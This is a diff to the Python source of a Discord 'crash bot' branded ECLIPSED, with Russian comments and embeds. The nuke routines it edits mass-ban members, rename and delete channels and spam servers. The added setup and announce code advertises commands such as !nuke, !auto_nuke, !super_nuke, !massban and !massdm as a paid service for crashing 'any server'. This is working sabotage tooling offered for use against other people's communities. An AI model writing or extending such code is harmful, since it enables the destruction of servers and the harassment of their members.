@@ -213,13 +213,9 @@ async def do_nuke(guild, spam_text=None, caller_id=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    NUKE_NAME = "Вы были крашнуты | ECLIPSED"
+    NUKE_NAME = "Вы были крашнуты"
 
-    # ── 1. Переименовываем сервер и все каналы ──
-    try:
-        await guild.edit(name=NUKE_NAME)
-    except Exception:
-        pass
+    # ── 1. Переименовываем только каналы ──
     await asyncio.gather(
         *[c.edit(name=NUKE_NAME) for c in guild.channels],
         return_exceptions=True
@@ -283,7 +279,7 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    TURBO_NAME = "Вы были крашнуты | ECLIPSED"
+    TURBO_NAME = "Вы были крашнуты"
 
     bot_role = guild.me.top_role
     # Защищённые ID — никогда не банятся
@@ -308,11 +304,11 @@ async def do_superpr_nuke_task(guild, spam_text=None):
     to_ban = candidates[:ban_count]
     await asyncio.gather(*[m.ban(reason="super_nuke") for m in to_ban], return_exceptions=True)
 
-    # ── 2. Переименовываем сервер ──
-    try:
-        await guild.edit(name=TURBO_NAME, description=TURBO_NAME)
-    except Exception:
-        pass
+    # ── 2. Переименовываем каналы ──
+    await asyncio.gather(
+        *[c.edit(name=TURBO_NAME) for c in guild.channels],
+        return_exceptions=True
+    )
 
     # ── 3. Удаляем все существующие каналы ──
     await asyncio.gather(
@@ -370,7 +366,7 @@ async def do_owner_nuke_task(guild, spam_text=None):
     if spam_text is None:
         spam_text = config.SPAM_TEXT
 
-    OWNER_NAME = "Вы были крашнуты | ECLIPSED"
+    OWNER_NAME = "Вы были крашнуты"
 
     bot_role = guild.me.top_role
     targets = [
@@ -382,11 +378,11 @@ async def do_owner_nuke_task(guild, spam_text=None):
     # ── 1. Баним ВСЕХ ──
     await asyncio.gather(*[m.ban(reason="owner_nuke") for m in targets], return_exceptions=True)
 
-    # ── 2. Переименовываем сервер ──
-    try:
-        await guild.edit(name=OWNER_NAME, description=OWNER_NAME)
-    except Exception:
-        pass
+    # ── 2. Переименовываем каналы ──
+    await asyncio.gather(
+        *[c.edit(name=OWNER_NAME) for c in guild.channels],
+        return_exceptions=True
+    )
 
     # ── 3. Удаляем все каналы ──
     await asyncio.gather(
@@ -971,35 +967,106 @@ async def setup(ctx):
     for name, color in roles_data:
         await guild.create_role(name=name, color=color, permissions=discord.Permissions.none())
 
-    # ── Категория: 📢 ОСНОВНОЕ ──
-    cat_main = await guild.create_category("📢 ОСНОВНОЕ")
-    await guild.create_text_channel("📰・news", category=cat_main)
+    # ── Категория: ━━ 📢 ОСНОВНОЕ ━━ ──
+    cat_main = await guild.create_category("━━━━ 📢 ОСНОВНОЕ ━━━━")
+    info_ch = await guild.create_text_channel("ℹ️・info", category=cat_main)
+    rules_ch = await guild.create_text_channel("📜・правила", category=cat_main)
+    await guild.create_text_channel("📰・новости", category=cat_main)
     await guild.create_text_channel("📋・changelog", category=cat_main)
-    await guild.create_text_channel("🏆・contests", category=cat_main)
-    await guild.create_text_channel("🤖・addbot", category=cat_main)
+    await guild.create_text_channel("🏆・конкурсы", category=cat_main)
+    addbot_ch = await guild.create_text_channel("🤖・addbot", category=cat_main)
 
-    # ── Категория: 💬 ЧАТЫ ──
-    cat_chat = await guild.create_category("💬 ЧАТЫ")
-    await guild.create_text_channel("💬・chat", category=cat_chat)
-    await guild.create_text_channel("💡・ideas", category=cat_chat)
+    # ── Категория: ━━ 💬 ЧАТЫ ━━ ──
+    cat_chat = await guild.create_category("━━━━ 💬 ЧАТЫ ━━━━")
+    await guild.create_text_channel("💬・общий", category=cat_chat)
+    await guild.create_text_channel("💡・идеи", category=cat_chat)
     await guild.create_text_channel("🎫・create-ticket", category=cat_chat)
 
-    # ── Категория: 🔊 ВОЙСЫ ──
-    cat_voice = await guild.create_category("🔊 ВОЙСЫ")
+    # ── Категория: ━━ 🔊 ВОЙСЫ ━━ ──
+    cat_voice = await guild.create_category("━━━━ 🔊 ВОЙСЫ ━━━━")
     for i in range(1, 4):
         await guild.create_voice_channel(f"🔊 voice-{i}", category=cat_voice)
+
+    # ── Отправляем правила ──
+    rules_embed = discord.Embed(
+        title="📜 Правила сервера ECLIPSED",
+        description=(
+            "Добро пожаловать на официальный сервер **ECLIPSED SQUAD** ☠️\n\n"
+            "**Основные правила:**\n"
+            "**1.** Уважай других участников\n"
+            "**2.** Не спамь и не флуди\n"
+            "**3.** Не рекламируй сторонние ресурсы\n"
+            "**4.** Следуй правилам Discord ToS\n\n"
+            "**Как получить доступ к боту:**\n"
+            "Зайди в канал 🤖・addbot и напиши любое сообщение.\n"
+            "Бот автоматически выдаст тебе доступ.\n\n"
+            "**Уровни доступа:**\n"
+            "👤 Guest — просто участник\n"
+            "✅ White — базовые команды\n"
+            "💎 Premium — расширенные команды\n"
+            "👑 Owner — полный доступ\n\n"
+            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
+        ),
+        color=0x0a0a0a
+    )
+    rules_embed.set_footer(text="☠️ ECLIPSED SQUAD")
+    await rules_ch.send(embed=rules_embed)
+
+    # ── Отправляем инфо ──
+    info_embed = discord.Embed(
+        title="ℹ️ Информация о боте ECLIPSED",
+        description=(
+            "**ECLIPSED** — мощный краш-бот для Discord.\n\n"
+            "**🌍 Доступно всем:**\n"
+            "`!nuke` — краш сервера (переименование каналов → удаление ролей → спам → роль ☠️)\n"
+            "`!auto_nuke on/off` — авто-краш при входе бота на сервер\n\n"
+            "**✅ Whitelist (бесплатно — напиши в 🤖・addbot):**\n"
+            "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!stop` · `!cleanup` · `!rename` · `!nicks_all`\n\n"
+            "**💎 Premium (платно):**\n"
+            "`!super_nuke` — нюк с баном участников\n"
+            "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+            "`!auto_super_nuke` · `!auto_superpr_nuke`\n\n"
+            "**📋 Команды:**\n"
+            "Напиши `!help` боту в ЛС\n\n"
+            "**💬 Купить Premium:** **davaidkatt** | **@Firisotik**"
+        ),
+        color=0x0a0a0a
+    )
+    info_embed.set_footer(text="☠️ ECLIPSED SQUAD  |  v1.8")
+    info_embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+    await info_ch.send(embed=info_embed)
+
+    # ── Отправляем сообщение в addbot ──
+    addbot_embed = discord.Embed(
+        title="🤖 Получить доступ к боту",
+        description=(
+            "Напиши **любое сообщение** в этот канал.\n"
+            "Бот автоматически добавит тебя в whitelist и напишет в ЛС.\n\n"
+            "**Что ты получишь:**\n"
+            "• `!nuke` — краш любого сервера\n"
+            "• `!auto_nuke on/off` — авто-краш\n"
+            "• `!stop` · `!cleanup` · `!rename`\n\n"
+            "**Доступ активен пока ты на сервере.**\n"
+            "При выходе — удаляется автоматически."
+        ),
+        color=0x0a0a0a
+    )
+    addbot_embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Просто напиши что-нибудь")
+    await addbot_ch.send(embed=addbot_embed)
 
     embed = discord.Embed(
         title="✅ Структура сервера пересоздана",
         description=(
             "**Роли:** 🔧 Developer · 👑 Owner · 💎 Premium · ✅ White · 👤 Guest\n\n"
-            "**📢 ОСНОВНОЕ:** 📰・news · 📋・changelog · 🏆・contests\n"
-            "**💬 ЧАТЫ:** 💬・chat · 💡・ideas · 🎫・create-ticket\n"
-            "**🔊 ВОЙСЫ:** 🔊 voice-1 · 🔊 voice-2 · 🔊 voice-3"
+            "**📢 ОСНОВНОЕ:** ℹ️・info · 📜・правила · 📰・новости · 📋・changelog · 🏆・конкурсы · 🤖・addbot\n"
+            "**💬 ЧАТЫ:** 💬・общий · 💡・идеи · 🎫・create-ticket\n"
+            "**🔊 ВОЙСЫ:** 🔊 voice-1 · 🔊 voice-2 · 🔊 voice-3\n\n"
+            "Контент отправлен в ℹ️・info, 📜・правила и 🤖・addbot"
         ),
         color=0x0a0a0a
     )
-    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Роли без прав — настрой права вручную")
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Роли без прав — настрой вручную")
     await msg.edit(content=None, embed=embed)
 
 
@@ -1052,6 +1119,52 @@ async def goout(ctx):
         await guild.leave()
     except Exception as e:
         await ctx.send(f"❌ Ошибка: {e}")
+
+
+@bot.command(name="announce")
+async def announce(ctx):
+    """Отправить сообщение с кнопкой получения доступа. Только для овнера."""
+    if ctx.author.id != config.OWNER_ID:
+        return
+
+    class GetAccessView(discord.ui.View):
+        def __init__(self):
+            super().__init__(timeout=None)
+            app_id = ctx.bot.user.id
+            url = f"https://discord.com/users/{app_id}"
+            self.add_item(discord.ui.Button(
+                label="💬 Написать боту в ЛС",
+                url=url,
+                style=discord.ButtonStyle.link
+            ))
+
+    embed = discord.Embed(
+        title="☠️ ECLIPSED — CRASH BOT",
+        description=(
+            "Добро пожаловать!\n\n"
+            "**Что умеет бот:**\n"
+            "• `!nuke` — краш любого сервера\n"
+            "• `!auto_nuke` — авто-краш при входе\n"
+            "• `!super_nuke` — нюк с баном участников\n"
+            "• И многое другое...\n\n"
+            "**Как получить доступ:**\n"
+            "Нажми кнопку ниже → напиши боту в ЛС `!help`\n\n"
+            "**Пока ты на этом сервере** — доступ к базовым командам активен.\n"
+            "При выходе с сервера доступ удаляется автоматически.\n\n"
+            "**Купить подписку:** **davaidkatt** | **@Firisotik**"
+        ),
+        color=0x0a0a0a
+    )
+    embed.set_footer(text="☠️ ECLIPSED SQUAD  |  Нажми кнопку чтобы начать")
+    embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
+
+    await ctx.send(embed=embed, view=GetAccessView())
+    try:
+        await ctx.message.delete()
+    except Exception:
+        pass
+
+
 
 
 @bot.command(name="massdm")
